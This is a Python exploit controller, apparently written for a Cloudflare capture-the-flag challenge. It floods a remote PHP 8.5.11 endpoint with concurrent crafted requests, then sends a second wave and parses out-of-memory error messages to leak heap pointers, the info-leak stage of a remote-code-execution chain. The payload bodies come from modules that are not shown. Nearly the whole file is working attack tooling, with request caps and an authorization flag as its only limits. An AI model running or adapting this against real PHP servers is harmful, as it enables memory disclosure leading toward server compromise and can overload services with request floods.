#!/usr/bin/env python3
"""One bounded flood-mounted heap oracle for the authorized Cloudflare CTF.

GDB on the official PHP 8.5.11 image proved the original ``steer_ht`` B body
returns ``HashTable.arData`` whenever it reaches a worker previously hit by A.
This controller changes only scheduling: flood A once, then send one bounded B
wave.  It has no terminal, readback, verifier, retry, or target option.
"""

from __future__ import annotations

import argparse
import concurrent.futures
import hashlib
import importlib
import json
import os
from pathlib import Path
import re

import steer_refresh_hotband_live as decoder


HOST = "php-rce.cloudflare.app"
PORT = 443
PATH = "/php/index.php"
ARRAYS = 900
PRESSURE = 550_000
MAX_ARMS = 80
MAX_B = 15
TRIED_RE = re.compile(rb"tried to allocate (\d+) bytes")
STATUS_RE = re.compile(rb"^HTTP/1\.[01]\s+(\d{3})")


def response_record(raw: bytes, error: str | None = None) -> dict:
    status_match = STATUS_RE.match(raw)
    tried_match = TRIED_RE.search(raw)
    tried = int(tried_match.group(1)) if tried_match else None
    decoded = decoder.decode_tried(tried)
    record = {
        "status": int(status_match.group(1)) if status_match else 0,
        "oom": b"Allowed memory size" in raw and b"exhausted" in raw,
        "oom_4096": tried == 4096,
        "tried": tried,
        "response_bytes": len(raw),
        "response_sha256": hashlib.sha256(raw).hexdigest(),
        "error": error,
    }
    if decoded is not None:
        record.update(decoded)
    return record


def adjudicate_heap(records: list[dict]) -> tuple[str, dict | None]:
    accepted = [record for record in records if record.get("heap")]
    if not accepted:
        return "LEAK_MISS", None
    heaps = {str(record["heap"]) for record in accepted}
    if len(heaps) != 1:
        return "HEAP_CONFLICT", None
    selected = {
        "heap": accepted[0]["heap"],
        "votes": len(accepted),
        "oracles": sorted({str(record["oracle"]) for record in accepted}),
        "pointers": sorted({str(record["pointer"]) for record in accepted}),
    }
    return "STRICT_HEAP", selected


def send_wave(count: int, sender) -> list[tuple[bytes, str | None]]:
    def send(index: int) -> tuple[int, bytes, str | None]:
        try:
            return index, sender(), None
        except Exception as error:
            return index, b"", f"{type(error).__name__}: {error}"

    completed = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=count) as executor:
        futures = [executor.submit(send, index) for index in range(count)]
        for future in concurrent.futures.as_completed(futures):
            completed.append(future.result())
    completed.sort(key=lambda item: item[0])
    return [(raw, error) for _index, raw, error in completed]


def write_bytes(path: Path, data: bytes) -> None:
    flags = os.O_WRONLY | os.O_CREAT | os.O_EXCL
    if hasattr(os, "O_NOFOLLOW"):
        flags |= os.O_NOFOLLOW
    descriptor = os.open(path, flags, 0o600)
    try:
        with os.fdopen(descriptor, "wb") as stream:
            descriptor = -1
            stream.write(data)
            stream.flush()
            os.fsync(stream.fileno())
    finally:
        if descriptor >= 0:
            os.close(descriptor)


def public_summary(receipt: dict) -> dict:
    return {
        "verdict": receipt.get("verdict"),
        "selected": receipt.get("selected"),
        "arm_oom": sum(bool(row.get("oom")) for row in receipt.get("arms", [])),
        "strict_b": sum(bool(row.get("heap")) for row in receipt.get("b", [])),
        "request_count": receipt.get("request_count"),
        "out": receipt.get("out"),
    }


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--arms", type=int, default=MAX_ARMS,
                        choices=range(1, MAX_ARMS + 1))
    parser.add_argument("--b-count", type=int, default=MAX_B,
                        choices=range(1, MAX_B + 1))
    parser.add_argument("--out-dir", required=True, type=Path)
    parser.add_argument("--authorized-live", action="store_true")
    parser.add_argument("--dry-run", action="store_true")
    return parser


def main(argv: list[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    if not args.authorized_live:
        parser.error("the exact public CTF requires --authorized-live")
    if os.path.lexists(args.out_dir):
        parser.error("--out-dir must be fresh")
    args.out_dir.mkdir(mode=0o700)

    steer = importlib.import_module("steer_ht")
    arm_body = steer.pre(steer.sc.arm_body())
    b_body = steer.build_b(ARRAYS, PRESSURE)
    receipt = {
        "schema": "cfctf/strict-heap-flood/v1",
        "target": f"https://{HOST}{PATH}",
        "geometry": {
            "arms": args.arms,
            "b_count": args.b_count,
            "arrays": ARRAYS,
            "pressure": PRESSURE,
            "schedule": "all A concurrent, then all B concurrent",
        },
        "wire": {
            "arm_bytes": len(arm_body),
            "arm_sha256": hashlib.sha256(arm_body).hexdigest(),
            "b_bytes": len(b_body),
            "b_sha256": hashlib.sha256(b_body).hexdigest(),
        },
        "request_cap": args.arms + args.b_count,
        "request_count": 0,
        "arms": [],
        "b": [],
        "selected": None,
        "verdict": "NOT_RUN",
        "out": str(args.out_dir),
    }

    if args.dry_run:
        receipt["verdict"] = "DRY_RUN"
        decoder.write_private(args.out_dir / "receipt.json", receipt)
        print(json.dumps(public_summary(receipt), indent=2, sort_keys=True))
        return 0

    def send_arm() -> bytes:
        _status, raw = steer.send(
            HOST, PORT, True, PATH, HOST, arm_body,
            timeout=180, bnd=steer.sc.ARM_BOUNDARY,
        )
        return raw

    def send_b() -> bytes:
        _status, raw = steer.send(
            HOST, PORT, True, PATH, HOST, b_body,
            timeout=180, bnd=steer.BND,
        )
        return raw

    for index, (raw, error) in enumerate(send_wave(args.arms, send_arm)):
        name = f"arm-{index:03d}.raw"
        write_bytes(args.out_dir / name, raw)
        record = response_record(raw, error)
        record["raw_path"] = name
        receipt["arms"].append(record)
    receipt["request_count"] += len(receipt["arms"])

    for index, (raw, error) in enumerate(send_wave(args.b_count, send_b)):
        name = f"b-{index:03d}.raw"
        write_bytes(args.out_dir / name, raw)
        record = response_record(raw, error)
        record["raw_path"] = name
        receipt["b"].append(record)
    receipt["request_count"] += len(receipt["b"])

    receipt["verdict"], receipt["selected"] = adjudicate_heap(receipt["b"])
    if receipt["request_count"] > receipt["request_cap"]:
        raise RuntimeError("request cap violated")
    decoder.write_private(args.out_dir / "receipt.json", receipt)
    print(json.dumps(public_summary(receipt), indent=2, sort_keys=True))
    return 0 if receipt["verdict"] == "STRICT_HEAP" else 2


if __name__ == "__main__":
    raise SystemExit(main())
